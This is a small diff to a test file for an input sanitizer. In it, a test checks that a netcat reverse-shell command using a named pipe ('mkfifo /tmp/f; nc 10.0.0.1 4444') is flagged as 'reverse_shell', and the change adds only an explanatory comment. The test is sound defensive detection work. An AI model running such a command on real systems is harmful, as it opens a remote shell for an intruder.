@@ -15,7 +15,7 @@ def test_bash_reverse_shell():
 def test_nc_reverse_shell():
     s = InputSanitizer()
     alerts = s.scan_arguments(
-        "server-1", "exec", {"cmd": "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f"}
+        "server-1", "exec", {"cmd": "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f"}  # attack payload uses Unix paths intentionally
     )
     reasons = {a.reason for a in alerts}
     assert "reverse_shell" in reasons
